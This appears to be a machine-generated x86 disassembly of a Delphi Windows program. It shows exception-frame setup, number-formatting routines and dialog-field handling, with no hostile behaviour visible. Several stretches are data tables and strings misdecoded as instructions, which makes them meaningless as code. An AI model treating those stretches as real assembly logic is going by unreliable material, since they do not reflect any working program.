cmp [ ebp - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
movsx eax [ ebp - 0x9 ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c366
movsx edx [ ebp - 0x14 ]
add edx 0x2
mov eax [ ebp - 0x18 ]
call sub_4027ac
retn
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x1
jg r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x30
jne r-xdata
dec [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + edx ] 0x0
sub_46c366
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_403fc0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_404278
sub_46c3b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46c4b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx ]
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x10 ]
call sub_4693bc
jmp r-xdata
cmp al 0x40
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c4be
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov dl [ ebx + 0x1 ]
test dl 0x80
setne [ ebp - 0x9 ]
mov esi eax
and esi 0xff
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x8 ] eax
and dl 0x3f
test dl dl
jbe r-xdata
mov edi esi
inc edi
mov eax esi
mov dl [ ebx + 0x1 ]
and dl 0x3f
sub al dl
movsx edi al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_404378
je r-xdata
sub al 0x3
jne r-xdata
mov al [ ebp - 0x9 ]
push eax
mov al [ ebx + 0x1 ]
and al 0x3f
and eax 0xff
cmp esi eax
sete al
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_46c270
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x2d
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fc0
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_404378
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx r-xdata
call sub_404378
jne r-xdata
sub_46c508
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi eax
xchg edx ecx
mov [ esi ] cl
mov [ esi + 0x1 ] dl
sub edx 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
or ebx ebx
jns r-xdata
ja r-xdata
mov edi 0xa
neg ebx
neg eax
sbb ebx 0x0
or [ esi + 0x1 ] 0x80
dec ecx
mov [ ecx + ebp - 0x40 ] 0x0
dec edx
jne r-xdata
fild [ ebp + 0x8 ]
fdiv [ edx * 4 + rw-data ]
fistp [ ebp + 0x8 ]
jmp r-xdata
mov [ ecx + ebp - 0x41 ] dl
dec ecx
jne r-xdata
xor edx edx
or ebx ebx
je r-xdata
mov edx eax
or edx ebx
je r-xdata
or eax ebx
mov al 0x0
jne r-xdata
div edi
xchg ebx eax
div edi
xchg ebx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov cl [ esi ]
inc ecx
shr ecx 0x1
mov ax [ ebp + ecx * 2 - 0x42 ]
shl al 0x4
or al ah
mov [ esi + ecx + 0x1 ] al
dec ecx
jne r-xdata
mov al 0x1
sub_46c594
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push edi
push esi
xor ebx ebx
mov edi eax
mov esi edx
mov al 0x0
movzx edx [ edi ]
or edx edx
je r-xdata
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x1 ]
shr ecx 0x1
mov al [ edi + ecx + 0x1 ]
mov ah al
shr al 0x4
and ah 0xf
mov [ ebp + ecx * 2 - 0x42 ] ax
dec ecx
jne r-xdata
xor eax eax
mov [ ebp - 0x44 ] eax
fild [ ebp - 0x44 ]
inc ecx
cmp ecx edx
jne r-xdata
mov al [ edi + 0x1 ]
or al al
jns r-xdata
fmul [ ebx + rw-data ]
mov al [ ecx + ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
fiadd [ ebp - 0x44 ]
jmp r-xdata
mov al [ ecx + ebp - 0x40 ]
or al al
jne r-xdata
fldz
jmp r-xdata
and eax 0x3f
sub eax 0x4
neg eax
call j_sub_402d70
fchs
inc ecx
cmp ecx edx
je r-xdata
fwait
fnstcw [ ebp - 0x46 ]
fldcw [ ebx + rw-data ]
fistp [ esi ]
fwait
fnstsw ax
not al
and al 0x1
fwait
fnclex
fldcw [ ebp - 0x46 ]
fwait
sub_46c62c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c65d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c664
retn
mov eax rw-data
call sub_40d3ac
sub_46c913
dec [ ebx ]
add [ eax ] al
add [ esi + 0x4d ] al
push esp
inc edx
arpl [ esi + eax * 2 + 0x69 ] sp
insb
add [ fs : eax ] ch
leave
inc esi
add [ edi ] cl
or cl [ ecx + 0x44 ]
inc edx
push ebx
jae r-xdata
add al 0xe8
jmp sub_405a70
imul ebp [ edi + 0x6e ] r-xdata
add ebx edi
dec eax
and al 0xcc
jb r-xdata
add [ eax ] al
add bh bh
mov [ 0x77f7934b ] al

sub_46c94f
dec esp
add eax 0xffffffec
jmp r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_403fc0
pop esi
pop ebx
retn
sub_46c9b6
imul ecx ecx 0xc9730046
inc esi
add [ ebp - 0x37 ] bh
inc esi
add [ ecx - 0x37 ] dl
inc esi
add [ ecx - 0x37 ] bl
inc esi
add [ ecx - 0x37 ] ah
inc esi
add [ edi - 0x5effb937 ] dl
leave
inc esi
add [ ebx - 0x78ffb937 ] ch
leave
inc esi
add [ edi + 0x20046c9 ] cl
add [ eax ] al
add [ esi - 0x21 ] dh
mov al [ 0xffffffffaaec6afa ]
dec eax
xchg edi eax
push esp
sub eax 0x5c81df36
or eax sub_46c9b6
adc al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch al
mov eax [ 0xffffffffcd6adc29 ]
inc esp
mov dh bl
dec edi
push ecx
mov dl 0x5d
pop ecx
xchg ebp eax
into
leave
inc esi
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x46ca6cc0 ] cl
add dl ah
leave
inc esi
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 8 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x36 ] bh
inc esi
add [ eax + eax ] bl
add [ eax ] al
sub al 0x12
inc eax
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
sbb edx [ esp + eax * 2 + 0x65 ]
popa
jne r-xdata
je r-xdata
pop esi
pop ebx
retn
inc edx
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ecx
jo r-xdata
mov ecx 0x26
mov edx [ r-xdata ]
call sub_404a20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cb27
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax eax
mov al [ eax + 0xc ]
retn
sub_46cb2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46cb8d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cb94
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
mov ecx r-xdata
call sub_4059e0
mov eax rw-data
mov edx [ rw-data ]
mov ecx r-xdata
call sub_4059e0
sub edx 0xfffffff8
sub_46cbf0
push 0xe8004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bl ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ah ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh ch
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add al dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add cl dl
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dl dl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46cc6d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc74
retn
sub_46cc82
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3fffb932 ] ah
int 0x46
add [ ebp - 0x32 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ esi - 0x32 ] dh
inc esi
add [ ebx + eax ] ah
add [ eax ] al
mov al [ 0xffffffffac004560 ]
add al [ edx ]
ror [ ebp + eax * 2 + 0x458e7400 ] 0x0
js r-xdata
inc ebp
add [ edi + edi * 8 - 0x2a03ffbf ] ah
inc ebp
add [ ebx + ecx * 4 ] dh
inc ebp
add al dh
jbe r-xdata
inc eax
add al ah
mov dl 0x45
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
mov es [ ebp ]
fdivr [ ebx + 0x44 ]
add [ esp + edx * 4 + 0x45 ] cl
add [ eax - 0x59 ] al
inc ecx
add [ eax + edx * 4 - 0x6f27ffbb ] bl
inc ebp
add ah ah
xchg ecx eax
inc ebp
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edx + ebx * 4 + 0x45 ] bl
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax + 0x3400446f ] bl
mov al [ ebp ]
inc eax
mov eax [ 0x452c0045 ]
inc esp
add [ esi + ebp * 4 ] al
inc ebp
add [ ecx + esi * 4 + 0x45 ] ah
add [ eax ] ah
mov al 0x45
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ edx + esi * 4 + 0x44280045 ] bl
inc esp
add al bl
jo r-xdata
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ edi + edx * 4 ] bh
inc ebp
add [ esi + ebp * 2 + 0x44 ] ch
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
cwde
inc ebp
add [ ebx + ebp + 0x44 ] bl
add [ esi + eax + 0x44 ] dh
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ edx + ebx * 4 ] ah
inc ebp
add al dh
cwde
inc ebp
add [ eax ] bh
or [ eax + eax - 0x64 ] eax
0x2be00045 0x44
clc
add al [ eax ]
add [ eax ] al
add [ 0x656e6150 ] al
insb
cld
add al [ eax ]
add [ ecx ] al
add [ 0x65766542 ] al
insb
add [ ebx ] al
add [ eax ] al
add al [ eax ]
or al 0x44
popad
je r-xdata
add [ eax - 0x53ffba47 ] dl
add [ eax + eax + 0x1c ] 0x6d
inc esp
add [ esi + ecx * 8 - 0x7bd7ffbb ] ah
inc ebp
add al bl
xchg [ ebp ] al
test [ edi - 0x703fffbb ] bh
inc ebp
add [ eax + edx * 4 ] bh
inc ebp
add [ edx + edx * 8 - 0x7307ffbb ] al
inc ebp
add [ eax + 0x680045cd ] cl
mov ah 0x45
add [ edi + ecx * 8 ] bh
inc ebp
add [ eax ] ah
0xb0045 0xce83
inc esi
add al bh
add [ eax + eax ] al
bound esp [ ecx + 0x73 ]
dec esi
popad
insd
add al 0x3
add [ eax ] al
add eax [ eax ]
or [ edi + 0x4b ] cl
inc edx
jne r-xdata
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46cfc8
ja r-xdata
insd
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_45b344
nop
push ebp
jb r-xdata
inc esi
outsd
outsb
or [ ebx ] al
add [ eax ] al
add eax [ eax ]
or al 0x43
popad
outsb
arpl [ ebp + 0x6c ] sp
inc edx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cfad
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4408a4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_403fc0
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_4408a4
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403fc0
mov [ ebp - 0x1 ] 0x1
inc edx
dec esp
and [ ebx ] al
add [ eax ] al
add al 0x0
or [ ebp + 0x73 ] dl
jb r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458b34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46cfa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
mov edx esi
call sub_4408d4
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4408d4
mov [ ebp - 0x1 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
enter 0x46cf 0x0
push ebx
push 0x540c776f
dec esp
outsd
imul ebp [ bp + 0x44 ] 0x6f6c6169
add ah bh
dec eax
inc ebx
add al ch
cmp al 0x43
add [ ebp - 0x315fffc0 ] cl
inc esi
add [ edi ] al
or al 0x54
dec esp
outsd
imul ebp [ bp + 0x44 ] 0x6f6c6169
int3
add [ ebx * 8 - 0x276fffbe ] bh
inc edx
add [ esp + esi + 0x43 ] cl
je r-xdata
outsd
inc esp
insb
add [ bx + si ] al
inc esi
add al ch
popad
inc ebp
add [ esi ] bl
or [ edx + eax * 2 + 0x4c ] al
jb r-xdata
popad
insd
add [ gs : eax ] eax
str esp
rol [ esi ] cl
or [ esi + 0x6f ] al
add eax 0x42dd3c00
add [ eax + 0x4c0042d8 ] dl
xor al 0x43
outsd
or [ eax + 0x61 ] dl
jae r-xdata
outsb
or al 0x3
add [ eax ] al
add [ eax ] al
push es
push eax
popad
outsb
insb
xor [ eax ] edx
add eax [ eax ]
add [ edx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] edx
add [ eax ] al
add al [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor bl [ eax ]
add eax [ eax ]
add [ edx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor ebx [ ebx + eax ]
add [ eax ] al
add al 0x0
sub_46cfdc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push j_sub_403970#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458b34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46d0d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
mov edx esi
call sub_4408d4
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4408d4
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_45b344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d0dd
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4408a4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_403fc0
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_4408a4
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403fc0
mov [ ebp - 0x1 ] 0x1
sub_46d10c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d2ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_458b34
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_46d290
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4408d4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
xor edx edx
call sub_4407c4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x300 ]
xor edx edx
call sub_4407c4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x318 ]
xor edx edx
call sub_4407c4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f8 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_440084
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x304 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_440038
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x308 ]
mov edx [ eax + 0x44 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x2fc ]
sub edx [ ecx + 0x44 ]
call sub_440038
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2fc ]
sub edx [ eax + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_440084
mov edx [ ebx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4408d4
mov [ ebp - 0x1 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xec ]
dec eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x320 ]
mov eax [ ebp - 0x8 ]
call sub_45b344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d297
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x320 ]
call sub_4408a4
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_403fc0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x31c ]
call sub_4408a4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403fc0
mov [ ebp - 0x1 ] 0x1
sub_46d2cc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x2f8 ]
call sub_4402a8
mov esi [ ebx + 0x300 ]
mov edx [ esi + 0x48 ]
add edx [ esi + 0x40 ]
cmp eax edx
jg r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x2f8 ]
call sub_4402a8
mov edx eax
mov eax [ ebx + 0x300 ]
sub edx [ eax + 0x40 ]
sub edx 0x5
mov eax [ ebx + 0x300 ]
call sub_440060
sub_46d324
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403970#8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d350
retn
sub_46d354
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_46cfdc
mov eax [ rw-data ]
mov [ eax ] sub_46d314
mov eax [ rw-data ]
mov [ eax ] sub_46d10c
sub_46d6a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push j_sub_403970#7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x2fc ]
call sub_4408a4
cmp [ ebp - 0x4 ] 0x0
setne bl
mov edx ebx
mov eax [ esi + 0x300 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx ebx
mov eax [ esi + 0x304 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
test bl bl
jne r-xdata
mov dl 0x1
cmp [ esi + 0x314 ] 0x0
jne r-xdata
xor edx edx
jmp r-xdata
mov eax [ esi + 0x30c ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d725
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_46d72c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_403970#6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_4408a4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov [ ebx + 0x314 ] 0x1
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d79e
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_46d7a4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46d808
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_4408a4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d80f
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_46d834
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46d87c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2fc ]
call sub_4408a4
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x318 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d883
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_46d888
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403970#5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d8bf
retn
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
sub_46d913
add eax 0xfffffff0
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ax [ eax + 0x44 ]
sub ax 0xffef
je r-xdata
mov al 0x2
retn
sub ax 0x6
je r-xdata
mov al 0x1
retn
sub ax 0xb
jne r-xdata
mov al 0x3
retn
xor eax eax
retn
sub_46d947
fadd [ esi ]
or ecx ebx
inc esi
add ch bl
fadd [ esi ]
in eax 0xd8
inc esi
add ch ch
fadd [ esi ]
and ebx ecx
inc esi
add [ 0x370046d9 ] ch
fld [ esi ]
adc ebx ecx
inc esi
add [ ebx ] bl
fld [ esi ]
add al [ eax ]
add [ eax ] al
jbe r-xdata
fadd [ esi ]
in eax dx
mov al [ 0xffffffffaaec6afa ]
dec eax
xchg edi eax
push esp
sub eax 0x5c81df36
or eax r-xdata
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch al
mov eax [ 0xffffffffcd6adc29 ]
inc esp
mov dh bl
dec edi
push ecx
mov dl 0x5d
pop ecx
xchg ebp eax
pop edx
fld [ esi ]
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
clc
fld [ esi ]
outsb
fld [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
fld [ esi ]
adc al 0x0
add [ eax ] al
sub al 0x12
inc eax
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ 0x4c435654 ] dl
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ecx
jo r-xdata
call sub_45e40c
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ax [ eax + 0x44 ]
sub ax 0xffef
je r-xdata
mov al 0x2
retn
sub ax 0x6
je r-xdata
mov al 0x1
retn
sub ax 0xb
jne r-xdata
mov al 0x3
retn
xor eax eax
retn
sub_46da60
sub dl 0x1
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45e40c
retn
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xfff5
call sub_45e40c
retn
dec dl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dx 0xffef
call sub_45e40c
jmp r-xdata
retn
sub_46dab0
or al [ eax ]
add [ eax ] al
mov eax 0xb4004700
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x66c80047 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004700 ] dh
inc di
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x67a40047 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x48004700 ] ch
inc di
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x650c0047 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffb900 ] ah
inc edi
add [ eax ] al
add [ eax ] al
